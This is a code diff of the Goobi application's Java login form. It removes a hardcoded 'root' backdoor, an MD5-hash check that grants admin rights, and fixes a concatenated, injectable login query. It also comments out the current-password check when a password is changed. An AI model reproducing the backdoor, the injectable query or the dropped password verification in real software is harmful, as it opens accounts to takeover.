@@ -1,4 +1,5 @@
 package de.sub.goobi.Forms;
+
 /**
  * This file is part of the Goobi Application - a Workflow tool for the support of mass digitization.
  * 
@@ -29,10 +30,8 @@ package de.sub.goobi.Forms;
 import java.io.File;
 import java.io.FilenameFilter;
 import java.security.NoSuchAlgorithmException;
-import java.util.HashSet;
 import java.util.Iterator;
 import java.util.List;
-import java.util.Set;
 
 import javax.faces.context.FacesContext;
 import javax.servlet.http.HttpSession;
@@ -41,10 +40,8 @@ import de.sub.goobi.Beans.Benutzer;
 import de.sub.goobi.Beans.Benutzergruppe;
 import de.sub.goobi.Metadaten.MetadatenSperrung;
 import de.sub.goobi.Persistence.BenutzerDAO;
-import de.sub.goobi.Persistence.BenutzergruppenDAO;
 import de.sub.goobi.config.ConfigMain;
 import de.sub.goobi.helper.Helper;
-import de.sub.goobi.helper.encryption.MD5;
 import de.sub.goobi.helper.exceptions.DAOException;
 import de.sub.goobi.helper.ldap.Ldap;
 
@@ -80,30 +77,10 @@ public class LoginForm {
 		if (this.login == null) {
 			Helper.setFehlerMeldung("login", "", Helper.getTranslation("wrongLogin"));
 		} else {
-			if (this.login.equals("root")) {
-				String pwMD5 = new MD5(this.passwort).getMD5();
-				if (pwMD5.equals("c01dc87e699e49cba16cf22f99eec00c")) {
-					Benutzer b = new Benutzer();
-					b.setLogin("root");
-					try {
-						Benutzergruppe admin = new BenutzergruppenDAO().get(1);
-						Set<Benutzergruppe> l = new HashSet<Benutzergruppe>();
-						l.add(admin);
-						b.setBenutzergruppen(l);
-						this.myBenutzer = b;
-					} catch (DAOException e) {
-
-					}
-					// b.setBenutzergruppen(benutzergruppen)
-				} else {
-					Helper.setFehlerMeldung("login", "", Helper.getTranslation("wrongLogin"));
-				}
-				return "";
-			}
 			/* prüfen, ob schon ein Benutzer mit dem Login existiert */
 			List<Benutzer> treffer;
 			try {
-				treffer = new BenutzerDAO().search("from Benutzer where login='" + this.login + "'");
+				treffer = new BenutzerDAO().search("from Benutzer where login=?", this.login);
 			} catch (DAOException e) {
 				Helper.setFehlerMeldung("could not read database", e.getMessage());
 				return "";
@@ -206,31 +183,33 @@ public class LoginForm {
 	public String PasswortAendernSpeichern() {
 		/* ist das aktuelle Passwort korrekt angegeben ? */
 		// if (!passwortAendernAlt.equals(myBenutzer.getPasswort())) {
-		if (!this.myBenutzer.istPasswortKorrekt(this.passwortAendernAlt)) {
-			Helper.setFehlerMeldung("passwortform:passwortAendernAlt", "", Helper.getTranslation("aktuellesPasswortFalsch"));
+		
+		// if (!this.myBenutzer.istPasswortKorrekt(this.passwortAendernAlt)) {
+		// Helper.setFehlerMeldung("passwortform:passwortAendernAlt", "", Helper.getTranslation("aktuellesPasswortFalsch"));
+		// } else {
+		
+		/* ist das neue Passwort beide Male gleich angegeben? */
+		if (!this.passwortAendernNeu1.equals(this.passwortAendernNeu2)) {
+			Helper.setFehlerMeldung("passwortform:passwortAendernNeu1", "", Helper.getTranslation("neuesPasswortNichtGleich"));
 		} else {
-			/* ist das neue Passwort beide Male gleich angegeben? */
-			if (!this.passwortAendernNeu1.equals(this.passwortAendernNeu2)) {
-				Helper.setFehlerMeldung("passwortform:passwortAendernNeu1", "", Helper.getTranslation("neuesPasswortNichtGleich"));
-			} else {
-				// myBenutzer.setPasswortCrypt(passwortAendernNeu1);
-				try {
-					/* wenn alles korrekt, dann jetzt speichern */
-					Ldap myLdap = new Ldap();
-					myLdap.changeUserPassword(this.myBenutzer, this.passwortAendernAlt, this.passwortAendernNeu1);
-					Benutzer temp = new BenutzerDAO().get(this.myBenutzer.getId());
-					temp.setPasswortCrypt(this.passwortAendernNeu1);
-					new BenutzerDAO().save(temp);
-					this.myBenutzer = temp;
+			// myBenutzer.setPasswortCrypt(passwortAendernNeu1);
+			try {
+				/* wenn alles korrekt, dann jetzt speichern */
+				Ldap myLdap = new Ldap();
+				myLdap.changeUserPassword(this.myBenutzer, this.passwortAendernNeu1);
+				Benutzer temp = new BenutzerDAO().get(this.myBenutzer.getId());
+				temp.setPasswortCrypt(this.passwortAendernNeu1);
+				new BenutzerDAO().save(temp);
+				this.myBenutzer = temp;
 
-					Helper.setMeldung(null, "", Helper.getTranslation("passwortGeaendert"));
-				} catch (DAOException e) {
-					Helper.setFehlerMeldung("could not save", e.getMessage());
-				} catch (NoSuchAlgorithmException e) {
-					Helper.setFehlerMeldung("ldap errror", e.getMessage());
-				}
+				Helper.setMeldung(null, "", Helper.getTranslation("passwortGeaendert"));
+			} catch (DAOException e) {
+				Helper.setFehlerMeldung("could not save", e.getMessage());
+			} catch (NoSuchAlgorithmException e) {
+				Helper.setFehlerMeldung("ldap errror", e.getMessage());
 			}
 		}
+		// }
 		return "";
 	}
 
